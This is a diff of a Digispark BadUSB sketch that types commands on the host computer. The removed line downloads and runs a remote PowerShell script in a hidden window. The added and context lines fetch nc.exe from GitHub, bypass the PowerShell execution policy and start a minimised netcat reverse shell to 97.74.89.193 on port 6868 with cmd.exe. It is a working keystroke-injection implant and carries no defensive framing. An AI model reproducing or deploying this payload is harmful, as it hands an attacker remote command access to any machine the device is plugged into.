@@ -17,7 +17,7 @@ void setup() {
   DigiKeyboard.delay(1000);
   
   // Gõ lệnh CmdShell
- DigiKeyboard.println("powershell -W hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://matilda.vn/power.ps1'); huyremy -c 97.74.89.193 -p 6868 -e cmd.exe");
+ DigiKeyboard.println("cd / & mkdir win & cd win & echo (wget 'https://github.com/huyremy/netcat/raw/main/nc.exe' -OutFile nc.exe) > h.PS1 & powershell -ExecutionPolicy ByPass -File h.ps1");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("START /MIN nc.exe 97.74.89.193 6868 -e cmd.exe -d & exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
